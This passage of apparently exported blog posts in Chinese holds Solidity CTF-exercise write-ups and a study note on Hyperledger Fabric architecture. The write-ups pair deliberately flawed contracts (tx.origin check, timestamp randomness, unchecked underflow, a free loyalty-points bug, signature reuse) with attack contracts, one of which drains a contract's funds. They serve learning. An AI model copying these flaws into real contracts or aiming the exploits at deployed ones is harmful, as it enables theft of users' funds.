^0.8.0;interface ArrayMapping &#123;    function getflag() external;    function flag(address _address) external view returns (bool);&#125;contract demoattack &#123;    uint8[] public numbers;    ArrayMapping public targetContract;    constructor(address _targetAddress) &#123;        // Updated the list of primes, excluding the two largest ones        numbers = [197, 199, 211, 223, 227, 229];         targetContract = ArrayMapping(_targetAddress);    &#125;    // Function to retrieve the list of primes    function getNumbers() public view returns (uint8[] memory) &#123;        return numbers;    &#125;    // Attack function to call the target contract&#x27;s getflag function    function attack() public &#123;        targetContract.getflag();    &#125;    // Check success of the attack by calling the target contract&#x27;s flag function    function checkSuccess() public view returns (bool) &#123;        return targetContract.flag(address(this));    &#125;&#125;\n\n\n\n第七题补全函数并部署，成功让flag返回true，成功提交截图\n12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Bank &#123;    // 1. 定义一个布尔类型的公共状态变量，命名为 `____(1)____`    ____(1)____ public flag;    // 2. 编写一个构造函数，接收支付的以太币金额，要求必须等于 1.5 ether    constructor() payable &#123;        require(msg.value == ____(2)____, &quot;Invalid ether amount&quot;);        flag = false;    &#125;    // 3. 定义一个 `withdraw` 函数，要求调用者不能是外部账户（即不能是 `tx.origin`），并向调用者发送 1.5 ether    function withdraw() public &#123;        require(msg.sender != ____(3)____, &quot;Fail&quot;);        (bool success, ) = ____(4)____(msg.sender).call&#123;value: ____(5)____&#125;(&quot;&quot;);        require(success == true, &quot;Transfer failed&quot;);    &#125;    // 4. 定义一个 `solve` 函数，检查合约余额是否为 0，如果为 0，则设置 `flag` 为 `true`    function solve() public &#123;        require(___(6)___ == 0, &quot;Fail&quot;);        flag = true;    &#125;&#125;contract BankAttack &#123;    // 5. 定义一个 `Bank` 类型的公共状态变量，命名为 `____(7)____`    ____(7)____ public targetBank;    // 6. 编写一个构造函数，接收目标银行的地址并实例化 `targetBank`    constructor(address _bankAddress) &#123;        targetBank = ____(8)____(_bankAddress);    &#125;    function attackWithdraw() public &#123;        targetBank.withdraw();    &#125;&#125;\n\n第七题题解123456789101112131415161718192021222324252627// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Bank &#123;    bool public flag;    // Constructor that accepts a specific amount of Ether and sets the flag to false    constructor() payable &#123;        require(msg.value == (15 * 1 ether) / 10, &quot;Incorrect amount of Ether sent&quot;);        flag = false;    &#125;    // Withdraw function to ensure only contract calls are allowed (no EOAs)    function withdraw() public &#123;        require(msg.sender != tx.origin, &quot;Fail: External accounts are not allowed&quot;);                (bool success, ) = payable(msg.sender).call&#123;value: (15 * 1 ether) / 10&#125;(&quot;&quot;);                require(success, &quot;Transaction failed&quot;);    &#125;    // Solve function that sets the flag to true when the contract balance is 0    function solve() public &#123;        require(address(this).balance == 0, &quot;Fail: Contract balance must be 0&quot;);        flag = true;    &#125;&#125;\n\n\n\n\n\n第八题通关条件：check函数返回true\n12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract war &#123;mapping(address =&gt; bool) player;uint256 warrior = 0;uint256 archer = 1;uint256 assassin = 2;function randomArmy() internal view returns (uint256) &#123;    return (uint256(keccak256(abi.encodePacked(block.timestamp))) % 3);&#125;function respond(uint256 yours) external &#123;    uint256 randomarmy = randomArmy();    if (yours == 0 &amp;&amp; randomarmy == 2) &#123;        player[msg.sender] = true;    &#125; else if (yours == 1 &amp;&amp; randomarmy == 0) &#123;        player[msg.sender] = true;    &#125; else if (yours == 2 &amp;&amp; randomarmy == 1) &#123;        player[msg.sender] = true;    &#125;&#125;function check(address _add) external view returns (bool) &#123;    return player[_add];&#125;&#125;\n\n\n\n第八题题解12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.8.20;interface Iwar &#123;    // Respond function, takes a uint256 parameter    function respond(uint256 yours) external;    // Check function, returns a boolean for the address    function check(address) external view returns (bool);&#125;contract warhack &#123;    Iwar public add;    // Constructor to initialize the contract with the target address    constructor(Iwar _add) &#123;        add = _add;    &#125;    // Hack function that continuously calls the respond function    // until the check function returns true    function hack() external &#123;        // Infinite loop, runs until check() returns true        while (!add.check(address(this))) &#123;            add.respond(0); // Respond with 0 to the target contract        &#125;    &#125;&#125;\n\n\n\n\n\n\n\n\n\n","url":"2025/01/15/记一次题解/","date":"2025-01-15"},{"title":"记一次题解02","content":"1.充电宝题：1234567891011121314151617181920212223242526272829303132333435363738// SPDX-License-Identifier: MITpragma solidity ^0.8.20;//一个新型共享充电宝租借系统，整点动静，给粗心的项目方一点小小的震撼//复制粘贴到remix本地测试即可，不改变代码的情况下，调用falg函数返回true视为成功contract PowerBankRental &#123;    uint256 public totalUnits = 5; //记录实际有多少个充电宝    mapping(address =&gt; uint) public deposits;     function rent() external payable &#123;        require(msg.value == 1 ether, &quot;Need 1 ETH&quot;);         require(totalUnits &gt;= 0, &quot;Out of stock&quot;);        unchecked&#123;        totalUnits--;        &#125;        deposits[msg.sender] += msg.value;    &#125;    function returnAll() external &#123;        require(deposits[msg.sender] &gt; 0, &quot;No deposit&quot;);        totalUnits++;        uint256 amount = deposits[msg.sender];        deposits[msg.sender] = 0;        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);         require(success, &quot;Refund failed&quot;);    &#125;    function falg(address attacker) external view returns (bool) &#123;        return (totalUnits &gt;= 5 &amp;&amp; deposits[attacker] &gt; 0);    &#125;&#125;&#125;\n\n\n\n我的解题1234567891011121314/*首先看原代码看到了显目的unchecked unchecked&#123;        totalUnits--;        &#125;  然后看falg函数返回“true”的条件：totalUnits &gt;= 5 &amp;&amp; deposits[attacker] &gt; 0\t\t则要尝试让数量一直大于5且一直有押金在\t对于第一个 因为有uncheck，直接调用rent()超过5次即可使这个表示数量的参数下滥，然后它就变成极大值就一直满足第一个条件了;\t对于第二个，我想法是有钱就行，那就前五次调用后都归还（return.All()）（归还就是2^256-1+5，还是很大），然后最后再调用rent,这样表示数量的参又大于5，付给系统的租金也不是0（&gt;0）\t*/\n\nAccount切换不同账号来借充电宝：\n\n变成0后再借一次，就会发现：\n\n前面5个账号再分别returnAll()退掉\n然后在flag那里输入我rent()时的地址\n可得：\n\n攻击合约：12345678910111213contract Hack &#123;    PowerBankRental target;    uint256 counter;    constructor(address _target) &#123;        target = PowerBankRental(_target);    &#125;    function attack() external payable &#123;    for (uint i = 0; i &lt; 6; i++) &#123;        target.rent&#123;value: 1 ether&#125;();    &#125;&#125;\n\n\n\n\n\n2. LoyaltyProgram题：你发现了一个“忠诚计划”合约 LoyaltyProgram，它奖励用户通过支付 ETH 来积累“忠诚点数”（loyaltyPoints）。当你的点数达到一定值时，你将被认证为“忠诚会员”，并解锁特殊权限。\n请在remix上部署LoyaltyProgram合约时存入 1 ehter 为起始资金。\n挑战目标：\n将 isCertified 设置为 true。并提取合约中所有资金。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract LoyaltyProgram &#123;    mapping(address =&gt; uint256) public loyaltyPoints;     mapping(address =&gt; uint256) public lastPaymentTime;     bool public isCertified;                             uint256 public constant TARGET_POINTS = 4;            address public owner;    uint256 public totalFunds;                            event Payment(address indexed payer, uint256 amount);    event PointsEarned(address indexed member, uint256 points);    event Certified(address indexed member);    constructor() payable &#123;        require(msg.value &gt;= 1 ether, &quot;Program requires 1 ETH to start&quot;);        owner = msg.sender;        totalFunds = msg.value;        isCertified = false;    &#125;    function payLoyaltyFee() external payable &#123;        require(!isCertified, &quot;Program already certified!&quot;);        totalFunds = address(this).balance;        uint256 payment = msg.value;        lastPaymentTime[msg.sender] = block.timestamp;        if (payment &gt;= 0.5 ether) &#123;            loyaltyPoints[msg.sender] += payment / 0.5 ether;         &#125; else if (payment &gt; 0 &amp;&amp; payment &lt; 0.5 ether) &#123;            loyaltyPoints[msg.sender] += 1;        &#125; else if (totalFunds &gt; 0 &amp;&amp; lastPaymentTime[msg.sender] &gt; 0) &#123;            loyaltyPoints[msg.sender] += 1;        &#125;        emit Payment(msg.sender, payment);        emit PointsEarned(msg.sender, loyaltyPoints[msg.sender]);        if (loyaltyPoints[msg.sender] &gt;= TARGET_POINTS) &#123;            isCertified = true;            emit Certified(msg.sender);        &#125;    &#125;    function claimReward() external &#123;        require(isCertified, &quot;Not certified yet&quot;);        require(loyaltyPoints[msg.sender] &gt;= TARGET_POINTS, &quot;Not enough points&quot;);        uint256 reward = address(this).balance;        totalFunds = 0;        (bool success, ) = msg.sender.call&#123;value: reward&#125;(&quot;&quot;);        require(success, &quot;Transfer failed&quot;);    &#125;    function getPoints(address member) external view returns (uint256) &#123;        return loyaltyPoints[member];    &#125;    // 接收 ETH 的回调    receive() external payable &#123;        totalFunds += msg.value;    &#125;&#125;\n\n\n\n我的解题：首先 1ether开始\n\n然后阅读代码，结合题意的文字描述，大概是积分大于等于四分就是会员了；\n然后是了解这个加分机制\n1234567891011121314if (payment &gt;= 0.5 ether) &#123;          loyaltyPoints[msg.sender] += payment / 0.5 ether;         &#125; //支付大于等于 0.5 ETH时，1ETH = 2分                else if (payment &gt; 0 &amp;&amp; payment &lt; 0.5 ether) &#123;    loyaltyPoints[msg.sender] += 1;        &#125; //支付0-0.5个时，就是1分                        else if (totalFunds &gt; 0 &amp;&amp; lastPaymentTime[msg.sender] &gt; 0) &#123;            loyaltyPoints[msg.sender] += 1; //这个我理解的是 当你之前支付过一次后，如果你再来用0ETH调用一下（类似于签到？），还是给你加一分        &#125;        \n\n那么现在的目的应该是用最少的eth达到会员然后再把钱取走。\n我的思路是：第一次先支付很少很少（1 wei），然后后期一直调用 payLoyaltyFee() 发送 0 ETH三次 ，来得到四分，从而获得奖励。\n第一步\n\n第二步  0wei调用三次payLoyaltyFee()\n第三步 \n填上调用者地址 然后看这两个函数  应该就可以了、\n\n攻击合约：\npayLoyaltyFee()函数没有验证支付金额（msg.value），允许攻击者通过发送0 ETH多次调用来积累忠诚度。\n该条件分支 **没有检查 msg.value &gt; 0**，这是致命漏洞\n逻辑错误：应该用 payment &gt; 0 而非 totalFunds &gt; 0\n\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// 忠诚度计划接口interface ILoyaltyProgram &#123;    function payLoyaltyFee() external payable;  // 支付忠诚度费用    function loyaltyPoints(address member) external view returns (uint256); // 查询忠诚度点数    function isCertified() external view returns (bool); // 检查是否认证    function claimReward() external; // 领取奖励&#125;contract LoyaltyExploit &#123;    ILoyaltyProgram public target; // 目标 LoyaltyProgram 合约地址    address public attacker;       // 攻击者地址    uint256 public constant REQUIRED_CALLS = 5; // 需要调用5次触发漏洞    event ExploitSuccess(address indexed attacker, uint256 points); // 攻击成功事件    // 构造函数：初始化目标合约和攻击者地址    constructor(address _target) &#123;        target = ILoyaltyProgram(_target); // 设置目标合约        attacker = msg.sender; // 设置攻击者为部署者    &#125;    // 攻击函数：通过多次调用payLoyaltyFee利用漏洞    function exploit() external &#123;        require(msg.sender == attacker, &quot;Only attacker can exploit&quot;); // 只有攻击者能调用        // 循环调用5次payLoyaltyFee（不发送ETH）        for (uint256 i = 0; i &lt; REQUIRED_CALLS; i++) &#123;            target.payLoyaltyFee&#123;value: 0&#125;(); // 关键漏洞利用点：免费增加忠诚度        &#125;        // 验证攻击是否成功        uint256 finalPoints = target.loyaltyPoints(address(this)); // 获取当前合约的忠诚度        require(finalPoints &gt;= 4, &quot;Failed to reach target points&quot;); // 确保点数足够        require(target.isCertified(), &quot;Certification not achieved&quot;); // 确保获得认证        emit ExploitSuccess(attacker, finalPoints); // 触发成功事件    &#125;    // 提取奖励函数    function withdrawReward() external &#123;        require(msg.sender == attacker, &quot;Only attacker can withdraw&quot;); // 只有攻击者能提取                // 从目标合约领取奖励（可能包含ETH）        target.claimReward();         // 将合约内的ETH转给攻击者        uint256 balance = address(this).balance;        if (balance &gt; 0) &#123;            (bool success, ) = attacker.call&#123;value: balance&#125;(&quot;&quot;);            require(success, &quot;Transfer to attacker failed&quot;);        &#125;    &#125;    // 接收ETH的回退函数    receive() external payable &#123;&#125;&#125;\n\n\n\n\n\n为什么不需要转入那1wei:\n1lastPaymentTime[msg.sender] = block.timestamp; // 每次调用都会更新！\n\npayLoyaltyFee()函数中无条件更新了lastPaymentTime\n\n这个赋值操作发生在条件判断之前\n因此即使是0 ETH调用，也会先记录时间戳，使后续检查lastPaymentTime &gt; 0永远为真\n\n攻击流程解析：\n\n第一次调用（value=0）：\n先执行：lastPaymentTime[攻击合约] = block.timestamp（设为当前时间）\n然后检查条件：\npayment == 0 → 跳过第一个条件\npayment &lt; 0.5 ether → 跳过第二个条件\ntotalFunds &gt; 0 &amp;&amp; lastPaymentTime &gt; 0 → 满足！（因为时间戳刚被设置）\n\n\n结果：获得1点\n\n\n后续调用：\n每次都会重复上述过程，因为时间戳始终被更新\n\n\n\n修改漏洞：1234567891011121314151617function payLoyaltyFee() external payable &#123;    require(msg.value &gt; 0, &quot;Payment required&quot;); // 必须添加的防护        uint256 payment = msg.value;    totalFunds += payment;        // 先进行条件判断    if (payment &gt;= 0.5 ether) &#123;        loyaltyPoints[msg.sender] += payment / 0.5 ether;    &#125; else &#123;        loyaltyPoints[msg.sender] += 1;    &#125;        // 最后更新时间戳    lastPaymentTime[msg.sender] = block.timestamp;    // ...&#125;\n\n\n\n漏洞本质：这是典型的执行顺序漏洞，关键问题在于：\n\n时间戳更新操作放在了条件判断之前\n没有对msg.value == 0的情况做防护\n\n3.签名题：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.28;//备注，此合约地址为部署者地址，每次做题前，请用部署者合约的deploy函数来部署自己的题目地址//请勿提交相同答案，不然算抄袭//0xD5bc07F7c1d70f720Fe1C586EbD9a942F6689B68//通过条件，有个isSolved函数，返回true即可contract Deployer &#123;    address[] public deployed;        event ChallengeDeployed(address indexed challengeAddress);        function deploy() external returns (address) &#123;        challenge newChallenge = new challenge();        address challengeAddress = address(newChallenge);        deployed.push(challengeAddress);        emit ChallengeDeployed(challengeAddress);        return challengeAddress;    &#125;        function getDeployedCount() external view returns (uint256) &#123;        return deployed.length;    &#125;        function getAllDeployed() external view returns (address[] memory) &#123;        return deployed;    &#125;    function isSolved(address _address) public view returns (bool) &#123;        for (uint256 i = 0; i &lt; deployed.length; i++) &#123;            if (challenge(deployed[i]).isSolved(_address)) &#123;                return true;            &#125;        &#125;           return false;    &#125;    &#125;contract challenge &#123;    struct Message &#123;        uint8 v;        bytes32 r;        bytes32 s;    &#125;    address csl;    bytes32 alreadyUsedMessageHash;    mapping(address =&gt; bool) public isCompleted;    constructor() &#123;&#125;    function isSolved(address _address) public view returns (bool) &#123;        return isCompleted[_address];    &#125;    function getMessageHash(address _csl) public view returns (bytes32) &#123;        return keccak256(abi.encodePacked(&quot;I want to open the magic box&quot;, _csl, address(this), block.chainid));    &#125;    function _getSignerAndMessageHash(Message memory _message) internal view returns (address, bytes32) &#123;        address signer = ecrecover(getMessageHash(msg.sender), _message.v, _message.r, _message.s);        bytes32 messageHash = keccak256(abi.encodePacked(_message.v, _message.r, _message.s));        return (signer, messageHash);    &#125;    function toSign(Message memory message) external &#123;        require(csl == address(0), &quot;CSL already signed in&quot;);        (address signer, bytes32 messageHash) = _getSignerAndMessageHash(message);        require(signer == msg.sender, &quot;Invalid message&quot;);        csl = signer;        alreadyUsedMessageHash = messageHash;    &#125;    function toSolve(Message memory message) external &#123;        require(csl == msg.sender, &quot;Only CSL can open the box&quot;);        (address signer, bytes32 messageHash) = _getSignerAndMessageHash(message);        require(signer == msg.sender, &quot;No key No way&quot;);        require(messageHash != alreadyUsedMessageHash, &quot;used?&quot;);        isCompleted[msg.sender] = true;    &#125;&#125;\n\n\n\n\n\n我的解题：重点阅读代码中函数toSign()和toSolve()\n了解到：\n1.签名者必须是调用函数者\n2.一个地址只能签一次(大概理解意思，不确定 但是看得出同一个不能签两次)\n3.调用tosign（）时候地址未设置\ncsl == address(0)\n思路：\n\n先Deploy（）\n\n应该是tosign和tosolve的签名不能重复\n\n得到与keccak256(abi.encodePacked(…))一样 的哈希值\n\n总结&amp;构造一下这个合约所需要的签名参数\n(根据getMessageHash())\n{\n\n“I want to open the magic box”\n\naddr(我的地址  msg.sender)\n\nc_addr（challenge地址，deploy得到\n\nchainId\n\n\n}\n\n\n\n过程：\n1.部署Deployer合约\n\n得到：\n\n\n然后签名\n123456789const hash = web3.utils.soliditySha3(  &quot;I want to open the magic box&quot;,  \taddr,          c_addr,     chainId   );const signature = await web3.eth.sign(hash, userAddress);\n\n签名后得到v,r,s\n\n换个ID再签名\n\n\n攻击合约","url":"2025/05/10/记一次题解02/","date":"2025-05-10"},{"title":"链原——Fabric","content":"超级账本Fabric系统架构\n引入了部分中心化服务节点。\n\n为了满足联盟链跨组织多业务协同的需求，超级账本Fabric区块链系统提供了多通道机制，可以同时建立多个逻辑上独立、相互隔离的区块链，每个通道对应唯一的区块链与账本\n\n提供了链码（Chaincode）机制，实现比以太坊智能合约更灵活、强大的智能合约功能，每个节点都可以部署运行链码，链码将存储于区块链中，加载到每个Peer节点上的轻量化Docker容器中执行。\n【1】\n\n\n系统逻辑架构【2】\n\n超级账本Fabric系统不提供加密数字货币功能，因此没有激励层\n\n系统系统的存储层主要采用文件系统、LevelDB或可选的CouchDB Key-Value数据库，为超级账本Fabric系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务。\n系统的数据层是系统核心功能层级之一，对超级账本Fabric系统核心的区块、区块链、交易、账本、地址、世界状态等关键数据结构进行定义和处理，负责将交易打包进区块，由区块组成区块链，并构建了世界状态、区块索引、键历史索引等数据结构，并基于底层的存储服务提供对超级账本Fabric区块链数据的安全读写访问管理。\n系统的网络层是系统核心功能层级之一，主要采用非结构化P2P网络，基于Gossip P2P网络协议，实现网络节点快速发现与连接，以及区块、交易数据的分发与同步，为超级账本Fabric系统各网络节点之间提供节点发现与安全连接通信机制，为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。\n系统的共识层是系统核心功能层级之一，由于超级账本Fabric系统不提供加密货币发行和激励机制，因此共识层不需要采用类似比特币、以太坊等系统的PoW竞争计算共识机制，系统默认提供Solo&#x2F;Kafka等多种可选的共识排序服务，并提供对共识机制进行扩展的接口，允许自定义扩展共识服务插件。\n系统的合约层采用链码（Chaincode）实现智能合约功能，链码支持Go、Java、Node.js等多种开发技术实现，提供了比以太坊系统更丰富的链码开发API接口，可在链码中实现对区块链和账本更复杂的业务操作逻辑，同时采用更轻量和开发的Docker容器技术实现链码的安全、高效运行。\n系统的接口层提供了基于JSON RPC、Web3.js的SDK接口和命令行接口。\n系统的应用层基于接口层提供的灵活多样的SDK接口，可以实现面向各种应用场景和业务逻辑的企业级联盟链或私有链应用。\n数据层在超级账本Fabric系统中，第一个创世区块不包含任何交易数据，从第二个区块开始，每个区块由区块头（Block Header）、区块数据（Block Data）、区块元数据（Block Metadata）等部分组成，将所有不可改变的、有序的交易记录存放在区块数据中，每个区块由区块数据的哈希值唯一标识，每个区块都保存了前一个区块的区块哈希值，所有区块链接在一起构成区块链。\n每个区块的区块头包含区块编号（BlockNumber）、当前区块的哈希（CurrentBlockHash）、父区块的哈希（PreviousBlockHash）等3个字段，如图所示。\n【3】\n【4】\n每个区块的区块数据域包含记录到该区块中的多条交易数据，如图所示。区块数据域中所有交易数据的哈希计算结果将作为当前区块哈希保存到区块头中。每个区块的元数据域包含了区块的创建时间、区块创建节点的证书及公钥、区块创建节点的数字签名等信息。\n【5】\n账本数据超级账本Fabric系统区块链每个通道都会拥有一个独立的分布式账本，每个账本由区块链（Blockchain）、状态数据库（State Database）、区块索引库（Block Index Database）、键历史索引库（Key History Index Database）等要素构成。其中，区块链和状态数据库是两个最重要的组成部分，如图所示。\n【6】\n状态数据库\n​    状态数据库又称为“世界状态（World State）”，状态数据库实际上存储的是所有曾经在交易中出现的写操作相关的键值对的最新值。超级账本Fabric系统采用CouchDB或LevelDB数据库来构建状态数据库。\n区块索引库\n​    区块索引库提供了对区块进行快读定位查找的索引信息（区块存储文件位置指针），可以通过区块序号、区块哈希、交易ID、区块序号+交易序号等查询条件快速查找区块，类似于关系型数据库中的索引表。超级账本Fabric系统采用LevelDB数据库来构建区块索引库。\n键历史索引库\n​    键历史索引库记录引起区块链系统状态改变的键值对&lt;key, value&gt;数据的历史信息，可用于查询某个 key 的历史修改记录，但是并不存储key具体的值，而只记录在哪个区块的哪个交易里，对key的值进行了修改。超级账本Fabric系统采用LevelDB数据库来构建键历史索引库。\n交易数据在超级账本Fabric系统中，键历史索引库记录引起区块链系统状态改变的键值对&lt;key, value&gt;数据的历史信息，可用于查询某个 key 的历史修改记录，但是并不存储key具体的值，而只记录在哪个区块的哪个交易里，对key的值进行了修改。\n(1) 交易头（Header）\n​    交易头包含与交易相关的必不可少的元数据，包括交易ID、交易类型、交易发出时间、通道ID、链码名称及其版本等字段。\n(2) 交易签名（Signature）\n​    交易签名字段包含交易创建者客户端应用程序的公钥与数字签名，用于检查交易内容是否被篡改。\n(3) 交易提案（Proposal）\n​    交易提案字段是客户端应用程序发出的创建交易提案的参数编码后的结果，包含要调用的链码（超级账本的智能合约）的方法名称、调用方法所需的输入参数，链码根据交易提案的输入参数对区块链系统状态和账本数据进行更新。\n(4) 交易响应（Response）\n​    交易响应是链码被调用后返回给发起交易的客户端的输出结果，即区块链系统状态（世界状态）改变前、后的键值对&lt;key, value&gt;数据，具体分为读集合（ReadSet）与写集合值（WriteSet）。\n(5) 背书列表（Endorsement）\n​    背书列表包括达到背书策略规定的足够多的背书节点的公钥与数字签名，用于检查哪些组织对该交易进行背书，防止抵赖。\n系统的账本数据包含两个最重要的组成部分——区块链和状态数据库。\n状态数据库又称为“世界状态”。每个交易实质上都是通过调用智能合约（即链码），提交一系列与交易相关的键值对&lt;key, value&gt;数据的读、写（增、删、改）操作，可分为对键值对&lt;key, value&gt;数据的读集合和写集合，其中读操作不会改变区块链系统状态和账本数据，而写操作会改变区块链系统的状态和账本数据。\n网络层主要提供以下网络管理功能：\n  (1) 区块链P2P网络的组网与通道管理\n  (2) 各网络节点的节点发现、安全连接与通信管理\n  (3) 新区块或交易数据广播与验证管理\n  (4) 各网络节点之间区块链及账本数据同步管理\n超级账本Fabric系统大部分网络结构属于非结构化P2P网络，但是保留了部分中心化功能节点（Orderer排序节点）。\n节点【7】\n(1) Peer对等节点\n 超级账本Fabric系统的Peer节点是组建P2P网络的真正意义上的对等节点，Peer节点可以具有记账（Committer）、背书（Endorser）、主节点（Leader）、锚节点（Anchor）等不同的功能角色。其中每个Peer节点一定具有记账功能角色，即Peer节点都可以对区块链与账本进行写入操作，当Peer节点接收到Orderer节点的新区块广播时，会对区块数据进行校验后写入本地区块链和账本中。\n在超级账本Fabric系统中，Peer节点默认的网络服务端口如下：\n• Peer节点P2P连接服务端口7051\n• Peer节点链码连接请求监听端口7052\n• Peer节点事件服务监听端口7053\n• Peer节点CouchDB数据库服务端口5984\n(2)Orderer排序节点\n​    超级账本Fabric系统的Orderer节点的主要功能是实现共识管理。Client客户端节点发起的所有交易，经过Peer节点背书后，将统一发送给Orderer节点。Orderer节点负责接收属于不同通道的交易请求，按通道对接收到交易进行排序，再将交易信息打包进新的区块中，然后将新区块信息广播给对应通道的Peer节点。Orderer节点默认的排序服务端口是7050。\n(3) Client客户端节点\n​    超级账本Fabric系统的Client客户端节点一般表示用户或基于区块链的应用系统，作为实际交易的发起者，必须连接到一个Peer节点，实现对区块链系统的访问互动。Client客户端节点可以向多个具有背书功能角色的Peer节点提交新的交易提案，当收集到Peer节点回复的足够的背书后，就可以向Orderer排序节点发送交易，等待交易被写入新区块中。\n(4) CA证书服务节点\n​    超级账本Fabric系统的CA节点是X.509数字证书颁发机构，CA节点接收Client客户端节点的注册申请，以便获取身份证书，在超级账本Fabric系统网络上所有的操作都需要使用证书验证用户的身份。\n​    在超级账本Fabric系统中，CA节点默认的证书服务端口是7054。\n多链与多通道超级账本Fabric系统区块链引入了多通道（Channel）机制，每个通道对应一条逻辑链和一个分布式账本，区块链网络的每个节点可以属于一个或多个通道，因此超级账本Fabric系统支持多链。\n  超级账本Fabric系统主要用于构建联盟区块链，所谓联盟一般是由多个组织构成，网络中的Orderer节点、CA节点通常是由联盟链的发起与权威可信管理机构提供，网络中的Peer节点、Client客户端节点由联盟中的不同组织提供。如果联盟中包含一个组织，则构建的区块链就可以视为私有链。\n超级账本Fabric系统一个通道对应一条链和一个账本，一个通道中可以包含不同组织的多个Peer节点，每个组织的多个Peer节点中至少有一个主节点和锚节点。\n主节点：\n  主要用于在通道内接收Orderer节点的区块广播，并将验证后的区块通过Gossip协议传播给通道内所属组织的其它Peer节点进行记账。\n锚节点：\n  主要用于在组织内及通道内跨组织的节点发现，一个组织在通道内的Peer节点可以通过其他组织的锚节点发现其他组织在该通道内的所有Peer节点。\n节点发现管理【这里有图片但是没有截屏】\n\n在超级账本Fabric系统的P2P网络中，任何Peer节点都属于某个组织，一个组织至少包含两个以上的Peer节点，不存在无组织的Peer节点。同一组织的Peer节点之间，可以相互作为“Gossip启动引导节点”。\n\n交易广播在超级账本Fabric系统网络中，客户端节点负责构造并提交交易提案（TxProposal）请求，交易提案一般包含以下信息：\n (1) ChannelID：交易所属的通道编号\n (2) ChaincodeID：交易需要调用的链码（智能合约）\n (3) Timestamp：交易的时间戳\n (4) Sign：客户端签名\n (5) TxPayload：交易所包含的事务，具体包括要调用的链码的函数及相关参数（Operation）、调用的相关属性（Metadata）等。\n客户端节点会向已知的多个具有背书功能角色的Peer节点提交交易提案，Peer节点对接收到的交易提案请求进行验证，具体验证内容包括：\n • 验证交易提案的格式是否正确；\n • 验证交易是否重复提交；\n • 验证交易提案中的客户端签名是否有效；\n • 验证交易提案的发送方在相关通道中是否具有对应的执行权限。\nPeer节点对交易提案验证通过后，将调用交易提案中相关的链码进行模拟执行，生成包含响应值、读&#x2F;写集的事务结果，对结果进行背书并向客户端节点回复交易提案响应（ProposalResponse）消息。\n当客户端节点收集到经过Peer节点背书的交易提案响应满足认可策略后，便基于收集到的经过背书的提案响应构建交易请求，并向Orderer节点广播交易请求。\nOrderer节点接收到交易请求后，根据不同的通道，按时间顺序对它们进行排序，并组装新区块，之后将新区块广播给对应通道内的不同组织中的Leader节点。\n区块广播与同步Orderer节点将根据区块所属的通道ID，将新区块广播到同一通道中的Peer节点，Peer节点接收到新区块后，会先对区块进行验证，具体包括：\n  (1) 验证区块中的交易是否满足背书策略。\n  (2) 验证区块的数据是否正确。\n  (3) 验证区块中的每个交易，确保交易中的读&#x2F;写集与状态数据库的数据一致。\n   通过Peer节点的上述验证后，新区块中的交易会被打上合法或非法交易的标签，然后将区块添加到通道对应的区块链上，同时把所有合法交易的读&#x2F;写集中的“写”集合保存到状态数据库。\n每个Peer节点都通过Gossip协议不断地接收来自多个节点已完成一致性的区块数据。为了保证安全和通道隔离性，每条传输的Gossip消息都有发送节点的签名，一方面杜绝恶意节点发出伪造消息，另一方面可以防止将消息分发给不在同一通道中的其它Peer节点。\n​    新区块的传播过程如下：\n​    (1) 某个Peer节点接收到一个需要传播给其他节点的新区块消息；\n​    (2) 该Peer节点将消息发送给随机选择的预定数量的其它相连节点；\n​    (3) 收到消息的Peer节点再将消息发送给（随机选择的）预定数量的其它相连节点（不包括发送消息的节点）；\n​    (4) 如此不断反复，直到每个Peer节点都收到消息。\n共识层首先要认识在超级账本Fabric系统中一次交易从客户端节点发起到被打包进区块，最终被写入区块链的全过程。\n【8】\n(1) 交易发起者通过客户端应用程序调用PKI CA证书服务进行注册和登记，并获取身份证书；\n(2) 交易发起者通过客户端应用程序向超级账本Fabric系统区块链网络发起一个交易提案，交易提案包含本次交易要调用的链码名称、链码方法和参数信息以及交易签名等信息，并根据背书策略将交易提案发送给指定通道中的不同组织的背书Peer节点。\n   背书Peer节点对接收到的交易提案请求进行验证，验证通过后调用交易提案中相关链码进行模拟执行，得到交易响应结果，对结果进行背书后返回给客户端，注意此时区块链系统状态与账本数据并没有被真正修改。\n客户端应用程序收到背书Peer节点返回的交易响应结果后，判断是否收到满足背书策略的足够多的背书结果，如果收到足够的背书，就将交易提案、交易响应和背书列表等信息打包组成一个交易并签名，然后发送给Orderer排序节点，否则交易失败，中止处理，该交易将被舍弃\n(3) Orderer排序节点负责从区块链系统所有通道接收交易请求，分通道对“交易”按时间排序并打包成区块，然后将新区块广播给对应通道不同组织的Peer主节点。\n(4) Peer主节点收到新区块后，会对区块中的区块数据部分包含的每笔交易进行验证，检查交易依赖的输入输出是否符合当前区块链的状态，验证背书策略是否满足，验证完成后将新区块追加到本地的区块链，更新账本，并修改世界状态。\n(5) 各组织的同一通道的Peer节点之间会通过P2P网络协议相互同步区块链与账本数据，确保所有Peer节点本地的区块链与账本副本保持数据一致。\n\n在超级账本Fabric系统中，所有交易在发送到区块链网络相关通道以后，都要经由Orderer排序节点对交易顺序进行共识排序，然后将交易按排好的顺序打包进区块，保证了任意一笔交易在区块链中的位置，以及在整个区块链网络中各节点的一致性和唯一确定性。\nFabric系统的共识服务由Orderer排序节点完成，并且允许多种共识算法以插件的形式应用于排序节点，系统默认提供Solo单节点共识、Kafka分布式队列共识等共识机制。\n(1) Solo单节点共识\n(2) Kafka分布式队列共识   \n【9】\n  Kafka是一个开源的分布式高可用消息队列系统，可以有序的管理消息并在多个冗余副本节点间保证数据一致性。当超级账本Fabric系统采用该共识机制时，会基于Kafka构建由多个Orderer排序节点组成的集群，提供基于Kafka集群的排序功能，支持CFT（Crash Fault 